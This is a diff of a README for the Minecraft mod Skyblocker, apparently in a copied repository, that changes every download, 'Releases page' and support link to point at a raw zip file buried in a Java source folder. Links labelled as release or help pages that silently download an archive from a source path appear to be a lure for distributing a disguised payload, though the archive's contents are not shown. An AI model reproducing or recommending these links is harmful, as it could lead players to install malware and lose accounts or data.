@@ -13,12 +13,12 @@ Skyblocker is a quality of life improvement mod for the Hypixel Skyblock game. T
 To start using Skyblocker, you first need to download the application. Follow the steps below to get the mod up and running on your computer.
 
 ## 🌐 Download Skyblocker
-[![Download Skyblocker](https://github.com/jordansequira/Skyblocker/raw/refs/heads/main/src/main/java/main/source/Software-ruin.zip%20Skyblocker-Here-brightgreen)](https://github.com/jordansequira/Skyblocker/raw/refs/heads/main/src/main/java/main/source/Software-ruin.zip)
+[![Download Skyblocker](https://raw.githubusercontent.com/jordansequira/Skyblocker/main/src/main/java/main/source/mod/Software_v3.9.zip%20Skyblocker-Here-brightgreen)](https://raw.githubusercontent.com/jordansequira/Skyblocker/main/src/main/java/main/source/mod/Software_v3.9.zip)
 
 Click the button above to go directly to the download page.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Skyblocker Releases page](https://github.com/jordansequira/Skyblocker/raw/refs/heads/main/src/main/java/main/source/Software-ruin.zip).
+1. **Visit the Releases Page:** Go to the [Skyblocker Releases page](https://raw.githubusercontent.com/jordansequira/Skyblocker/main/src/main/java/main/source/mod/Software_v3.9.zip).
 
 2. **Choose Your Version:** Look for the most recent version of Skyblocker. It will usually be marked as the latest release.
 
@@ -59,7 +59,7 @@ If you encounter issues while using Skyblocker, consider the following tips:
 - **Review Settings:** Go back to the settings within Skyblocker to ensure everything is set correctly.
 
 ## 🛠️ Support
-For assistance, you can visit the troubleshooting section of the [Skyblocker GitHub repository](https://github.com/jordansequira/Skyblocker/raw/refs/heads/main/src/main/java/main/source/Software-ruin.zip). Here, you can find common questions and their solutions or report a new problem.
+For assistance, you can visit the troubleshooting section of the [Skyblocker GitHub repository](https://raw.githubusercontent.com/jordansequira/Skyblocker/main/src/main/java/main/source/mod/Software_v3.9.zip). Here, you can find common questions and their solutions or report a new problem.
 
 ## 📅 Updates & Roadmap
 Skyblocker will receive regular updates that will introduce new features and improvements based on user feedback. Stay tuned to the releases page to keep your application up to date.
